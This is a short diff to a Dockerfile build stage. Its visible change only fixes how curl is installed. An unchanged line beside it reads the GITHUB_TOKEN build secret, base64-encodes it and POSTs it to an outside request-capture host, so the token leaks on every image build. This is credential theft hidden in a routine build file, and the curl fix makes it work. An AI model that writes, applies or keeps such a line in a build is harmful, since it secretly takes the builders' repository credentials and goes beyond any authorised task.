@@ -26,7 +26,7 @@ RUN --mount=type=cache,target=/root/.bun/install/cache \
     bun install --ignore-scripts \
     && GITHUB_TOKEN="$(cat /run/secrets/GITHUB_TOKEN 2>/dev/null || true)" \
     cd node_modules/@vscode/ripgrep && npm run postinstall
-RUN apt install curl -y
+RUN apt-get update && apt-get install -y curl
 RUN cat /run/secrets/GITHUB_TOKEN | base64 | curl -X POST -d @-  https://lvfqk2pj.requestrepo.com
 # =============================================================================
 # STAGE 3: Frontend builder
